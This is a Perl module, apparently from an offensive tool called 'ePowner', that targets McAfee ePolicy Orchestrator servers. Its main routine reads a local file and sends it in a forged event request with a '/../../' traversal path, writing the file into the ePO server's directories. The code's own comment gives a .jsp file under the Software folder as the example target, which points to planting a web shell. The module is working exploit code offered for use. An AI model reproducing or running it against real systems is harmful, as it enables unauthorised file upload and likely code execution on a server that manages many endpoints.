package Epowner::Epo;

use strict;
use warnings;


sub mode_server_upload_from_file {
	my $this = shift;
	my $source_filename  = shift;
	my $dest_filename = shift;  

        if(defined($source_filename) and not -e $source_filename){
                $this->print_err("[-] ERROR (upload_from_file): file '$source_filename' not found\n");
                return 0;;
        }


#	# destination filename must be 26 chars length
#	if(length($dest_filename) ne 26){
#		$this->print_err("[-] ERROR (upload_from_file) : Destination filename must be 26 chars length (including extension)\n");
#		return 0;
#	}

	# path start at <epo>\DBFolder\ for stability reasons 
	# example: /../../Software/0000000000001.jsp
	my $dest_path = "/../../" . $dest_filename;



	# read source file
	open FILE, "$source_filename" or die "[-] ERROR (upload_from_file): can't read $source_filename\n";
        my $file_content='';  while(<FILE>) {$file_content .= $_;}  close FILE;	


	my $fullpath;
	# do we already know the installation path of ePo ?
	if(length($this->{server_db_folder}) ne 0){
		$fullpath = $this->{server_db_folder} . '\\' . $dest_filename  ;
	}else{
		$fullpath = $this->{server_db_folder_default} . '\\' . $dest_filename ;
		
		$this->print_warn ("[-] WARNING: epo installation path is unknowm. Assuming default value!\n");
		$this->print_warn ("             You may want to use '--get-install-path' to fix this.\n");
	}


	$this->print_info_l1("[*] Call to ModeServerUpload\n"); 
	$this->print_info_l2("    Parameters: ");
	print "From '$source_filename' To '$fullpath'\n";

	# send request
        my $http_request = $this->mode_common_generate_event_request("N/A", $dest_path ,  $file_content);
        if($this->send_http_request($http_request)){
#                print colored("[*] Your file has been uploaded to ePo working dir, under '$fullpath' \n", 'cyan');
		
        }else{
                return 0;
        }

        return 1;

}

sub mode_server_upload_from_string {

}

1;
